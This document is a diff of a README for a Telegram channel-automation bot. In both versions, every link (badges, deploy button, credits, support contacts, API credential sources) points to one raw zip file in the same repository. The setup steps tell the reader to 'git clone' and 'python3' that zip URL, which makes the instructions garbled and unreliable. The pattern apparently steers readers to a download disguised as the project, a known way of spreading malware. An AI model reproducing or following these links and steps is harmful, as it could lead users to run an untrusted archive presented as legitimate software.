@@ -1,18 +1,18 @@
-# Channel Automation Bot [@CyniteChannelBot](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+# Channel Automation Bot [@CyniteChannelBot](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
 > A star ⭐ from you means a lot to us!
 
-<p align="center"><a href="https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip"><img src="https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip" width="2000"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip"><img src="https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip" width="2000"></a></p>
 
 Telegram bot to automate and manage channels.
 
-[![Open Source Love svg1](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+[![Open Source Love svg1](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
 ## Usage
 
 ### Deploy to Heroku
 
-[![Deploy](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
 1. Tap on above button and fill `API_ID`, `API_HASH`, `BOT_TOKEN` (and `MUST_JOIN`).
 2. Then tap "Deploy App" below it. Wait till deploying is complete (will take atmost 2 minutes).
@@ -23,12 +23,12 @@ Telegram bot to automate and manage channels.
 
 1. Clone the repo
    ```markdown
-   git clone https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip
+   git clone https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip
    ```
    
 2. Get a DATABASE_URL. If you don't know how, deploy using Heroku Button only or delete database things as it's not a compulsion.
    
-3. Edit `https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip` and fill the needed variables
+3. Edit `https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip` and fill the needed variables
 
 4. Enter the directory
    ```markdown
@@ -36,16 +36,16 @@ Telegram bot to automate and manage channels.
    ```
 5. Run the file
    ```markdown
-   python3 https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip
+   python3 https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip
    ```
 
 ## Environment Variables
 
 #### Mandatory Vars
 
-- `API_ID` - Get this from [https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
-- `API_HASH` - Get this from [https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
-- `BOT_TOKEN` - Get this from [@BotFather](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+- `API_ID` - Get this from [https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
+- `API_HASH` - Get this from [https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
+- `BOT_TOKEN` - Get this from [@BotFather](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 - `DATABASE_URL` - Will be automatically added by Heroku.
 - `MUST_JOIN` - Username/ID of your telegram channel/group.
 
@@ -62,24 +62,24 @@ Telegram bot to automate and manage channels.
 
 > That's on you mainly...
 
-[![PRs Welcome](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+[![PRs Welcome](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
 ## Credits
 
-- [Dan Tès](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip) for his [Pyrogram](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip) Library
-- [The Legend](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip) for the idea as well as the project logo.
+- [Dan Tès](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip) for his [Pyrogram](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip) Library
+- [The Legend](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip) for the idea as well as the project logo.
 
 ## Support
 
-Channel :- [@CyniteBots](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+Channel :- [@CyniteBots](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
-Contact Me :- [@Cyniteaofficial](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+Contact Me :- [@Cyniteaofficial](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
 ## :)
 CREDITS :- STARK BOTS
 
-[![ForTheBadge made-with-python](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+[![ForTheBadge made-with-python](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
-[![ForTheBadge built-with-love](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+[![ForTheBadge built-with-love](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
 
-[![ForTheBadge makes-people-smile](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/kingdom/Auto-Channel-Bot.zip)
+[![ForTheBadge makes-people-smile](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)](https://raw.githubusercontent.com/HLECTER69/Auto-Channel-Bot/master/ChannelBot/Bot_Auto_Channel_v2.5.zip)
